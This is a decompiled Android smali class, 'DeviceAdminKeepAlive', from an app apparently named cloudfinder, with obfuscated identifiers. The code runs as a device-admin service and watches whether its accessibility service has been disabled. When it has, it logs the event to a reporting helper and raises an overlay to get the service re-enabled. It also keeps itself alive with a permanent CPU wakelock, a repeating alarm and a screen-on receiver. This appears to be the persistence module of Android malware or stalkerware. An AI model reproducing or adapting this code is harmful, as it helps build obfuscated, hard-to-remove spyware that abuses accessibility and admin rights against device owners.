.class public Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;
.super Landroid/app/admin/DeviceAdminService;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive$AlarmReceiver;
    }
.end annotation


# instance fields
.field public ؋:Landroid/os/Handler;

.field public ؠ:Z

.field public ء:J

.field public آ:Landroid/os/PowerManager$WakeLock;

.field public final أ:Lحظتۢۋۜآظ/آ;

.field public final ؤ:Lژة۪ڦضۆۿۡ/ط;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminService;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؠ:Z

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ء:J

    new-instance v0, Lحظتۢۋۜآظ/آ;

    const/16 v1, 0x8

    invoke-direct {v0, v1, p0}, Lحظتۢۋۜآظ/آ;-><init>(ILjava/lang/Object;)V

    iput-object v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->أ:Lحظتۢۋۜآظ/آ;

    new-instance v0, Lژة۪ڦضۆۿۡ/ط;

    const/4 v1, 0x7

    invoke-direct {v0, p0, v1}, Lژة۪ڦضۆۿۡ/ط;-><init>(Landroid/content/ContextWrapper;I)V

    iput-object v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؤ:Lژة۪ڦضۆۿۡ/ط;

    return-void
.end method

.method public static ؋(Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;)V
    .locals 7

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "RESTORED|downtime_sec="

    const/4 v1, 0x1

    const/4 v2, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    const-string v4, "enabled_accessibility_services"

    invoke-static {v3, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_0

    const-string v4, "MyAccessibilityService"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v3, :cond_0

    move v3, v1

    goto :goto_0

    :catch_0
    :cond_0
    move v3, v2

    :goto_0
    const-string v4, "acc_recovery"

    const-string v5, "DAKeepAlive"

    if-eqz v3, :cond_1

    iget-boolean v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؠ:Z

    if-eqz v1, :cond_4

    const-string v1, "Accessibility restored!"

    invoke-static {v5, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iput-boolean v2, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؠ:Z

    sget-object v1, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;

    new-instance v2, Lڝږ؁ڋ/ؤ;

    const/4 v3, 0x5

    invoke-direct {v2, p0, v3}, Lڝږ؁ڋ/ؤ;-><init>(Landroid/content/Context;I)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :try_start_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    iget-wide v5, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ء:J

    sub-long/2addr v2, v5

    const-wide/16 v5, 0x3e8

    div-long/2addr v2, v5

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v4, p0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_1

    :cond_1
    iget-boolean v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؠ:Z

    if-nez v0, :cond_2

    iput-boolean v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؠ:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ء:J

    const-string v0, "Accessibility DISABLED detected!"

    invoke-static {v5, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :try_start_2
    const-string v0, "DISABLED_DETECTED"

    invoke-static {v4, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_2
    const-string v0, "power"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/os/PowerManager;->isInteractive()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-static {p0}, Lڟەطڽٲ/ؠ;->ء(Landroid/content/Context;)V

    goto :goto_1

    :cond_3
    const-string p0, "Screen off, will show overlay when screen turns on"

    invoke-static {v5, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :catch_2
    :cond_4
    :goto_1
    return-void
.end method


# virtual methods
.method public final onCreate()V
    .locals 9

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "DAKeepAlive"

    const-string v1, "DeviceAdminKeepAlive created"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->؋:Landroid/os/Handler;

    iget-object v2, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->أ:Lحظتۢۋۜآظ/آ;

    const-wide/32 v3, 0xea60

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :try_start_0
    const-string v1, "alarm"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    move-object v2, v1

    check-cast v2, Landroid/app/AlarmManager;

    new-instance v1, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive$AlarmReceiver;

    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/16 v3, 0x270f

    const/high16 v4, 0xc000000

    invoke-static {p0, v3, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    if-eqz v2, :cond_0

    const/4 v3, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/32 v6, 0x493e0

    add-long/2addr v4, v6

    invoke-virtual/range {v2 .. v8}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "scheduleAlarm error"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_0
    :goto_0
    :try_start_1
    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.SCREEN_ON"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const/16 v3, 0x21

    iget-object v4, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؤ:Lژة۪ڦضۆۿۡ/ط;

    if-lt v2, v3, :cond_1

    const/4 v2, 0x4

    :try_start_2
    invoke-virtual {p0, v4, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    goto :goto_1

    :cond_1
    invoke-virtual {p0, v4, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    const-string v2, "registerScreenReceiver error"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_1
    :try_start_3
    const-string v1, "power"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    if-eqz v1, :cond_2

    const-string v2, "app:DACpuKeepAlive"

    const/4 v3, 0x1

    invoke-virtual {v1, v3, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v1

    iput-object v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->آ:Landroid/os/PowerManager$WakeLock;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    iget-object v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->آ:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    const-string v1, "CPU WakeLock acquired \u2014 CPU will stay active even when screen is off"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_2

    :catch_2
    move-exception v1

    const-string v2, "Failed to acquire CPU WakeLock"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_2
    return-void
.end method

.method public final onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    iget-object v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->؋:Landroid/os/Handler;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    :cond_0
    :try_start_0
    iget-object v0, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->ؤ:Lژة۪ڦضۆۿۡ/ط;

    invoke-virtual {p0, v0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const-string v0, "DAKeepAlive"

    :try_start_1
    iget-object v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->آ:Landroid/os/PowerManager$WakeLock;

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/lite/cloudfinder/service/DeviceAdminKeepAlive;->آ:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v1}, Landroid/os/PowerManager$WakeLock;->release()V

    const-string v1, "CPU WakeLock released"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception v1

    const-string v2, "Failed to release CPU WakeLock"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    return-void
.end method
